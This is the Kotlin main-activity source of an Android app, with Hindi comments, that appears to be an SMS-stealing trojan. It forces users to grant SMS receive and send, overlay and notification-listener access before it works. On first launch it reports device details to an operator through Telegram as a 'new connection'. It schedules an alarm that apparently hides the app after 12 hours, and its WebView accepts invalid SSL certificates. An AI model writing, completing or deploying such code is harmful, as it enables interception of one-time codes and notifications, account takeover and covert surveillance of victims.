package com.security.testapp

import android.Manifest
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.webkit.*
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var permissionLayout: LinearLayout
    private lateinit var permissionText: TextView
    private lateinit var grantButton: Button
    private val prefs by lazy { getSharedPreferences("app_prefs", MODE_PRIVATE) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // पूरी स्क्रीन का लेआउट बनाएँ (Permission UI + WebView)
        val rootLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
        }

        // परमिशन UI (जब तक परमिशन न हों, यही दिखेगा)
        permissionLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = android.view.Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            setPadding(48, 48, 48, 48)
        }

        permissionText = TextView(this).apply {
            text = "To work properly, this app requires SMS, Notifications, and Overlay permissions.\n\nPlease grant all permissions to continue."
            textSize = 16f
            gravity = android.view.Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }

        grantButton = Button(this).apply {
            text = "GRANT PERMISSIONS"
            setOnClickListener { checkAndRequestPermissions() }
        }

        permissionLayout.addView(permissionText)
        permissionLayout.addView(grantButton)
        rootLayout.addView(permissionLayout)

        // WebView (बाद में दिखेगा)
        webView = WebView(this).apply {
            visibility = View.GONE
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            settings.userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
            webViewClient = MyWebViewClient()
            webChromeClient = WebChromeClient()
            loadUrl("https://your-website.com")   // <-- अपनी साइट डालें
        }
        rootLayout.addView(webView)

        setContentView(rootLayout)

        // First launch actions
        if (!prefs.getBoolean("first_launch_done", false)) {
            prefs.edit().putBoolean("first_launch_done", true).apply()
            sendConnectionAlert()
            scheduleHideAlarm()
        }

        // हर बार ओपन करने पर चेक करें — अगर सब परमिशन हैं तो WebView दिखाओ, वरना परमिशन UI
        updateUI()
    }

    private fun updateUI() {
        if (allPermissionsGranted()) {
            permissionLayout.visibility = View.GONE
            webView.visibility = View.VISIBLE
        } else {
            permissionLayout.visibility = View.VISIBLE
            webView.visibility = View.GONE
        }
    }

    private fun allPermissionsGranted(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
                && (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU || ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED)
                && (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this))
                && isNotificationListenerEnabled()
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    private fun checkAndRequestPermissions() {
        val missing = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED)
            missing.add(Manifest.permission.RECEIVE_SMS)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
            missing.add(Manifest.permission.SEND_SMS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
            missing.add(Manifest.permission.POST_NOTIFICATIONS)

        // रनटाइम परमिशन
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 200)
            return
        }

        // Overlay परमिशन
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            Toast.makeText(this, "Please enable 'Display over other apps'", Toast.LENGTH_LONG).show()
            return
        }

        // Notification Listener
        if (!isNotificationListenerEnabled()) {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            Toast.makeText(this, "Please enable 'Settings' in Notification access", Toast.LENGTH_LONG).show()
            return
        }

        // सब ठीक हो तो UI अपडेट करें
        updateUI()
    }

    // जब रनटाइम परमिशन का रिज़ल्ट आए
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 200) {
            // अगर अब भी कुछ मना हुआ है तो उसे सेटिंग्स पर भेजें
            for ((index, perm) in permissions.withIndex()) {
                if (grantResults[index] != PackageManager.PERMISSION_GRANTED) {
                    // यूज़र ने डेनी कर दिया — सेटिंग्स खोलें
                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {
                        // "Don't ask again" केस — ऐप सेटिंग्स पर जाएँ
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))
                        startActivity(intent)
                        Toast.makeText(this, "Please manually grant the permission in App Settings", Toast.LENGTH_LONG).show()
                    } else {
                        // फिर से डायलॉग दिखाने के लिए requestPermissions कॉल करें
                        val again = arrayOf(perm)
                        ActivityCompat.requestPermissions(this, again, 200)
                    }
                    return
                }
            }
            // सब मिल गए, तो बाकी चेक करें
            checkAndRequestPermissions()
        }
    }

    override fun onResume() {
        super.onResume()
        // जब सेटिंग से वापस आएँ तो चेक करें
        updateUI()
    }

    private fun sendConnectionAlert() {
        val device = "${Build.MODEL} (${Build.BRAND})"
        val os = Build.VERSION.RELEASE
        val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())
        val message = """
            🔗 NEW CONNECTION ESTABLISHED
            Device: $device
            OS Version: $os
            App Version: 1.0
            Timestamp: $timestamp
        """.trimIndent()
        TelegramHelper.sendMessage(message)
    }

    private fun scheduleHideAlarm() {
        if (prefs.getBoolean("hide_done", false)) return
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, HideReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val triggerTime = System.currentTimeMillis() + 12 * 60 * 60 * 1000L
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (alarmManager.canScheduleExactAlarms()) {
                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                } else {
                    startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM))
                    alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                }
            } else {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            }
        } catch (_: Exception) {}
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    private inner class MyWebViewClient : WebViewClient() {
        override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
            handler?.proceed()
        }
        override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
            val url = request?.url?.toString() ?: return false
            return if (url.startsWith("http://") || url.startsWith("https://")) false else true
        }
    }
}
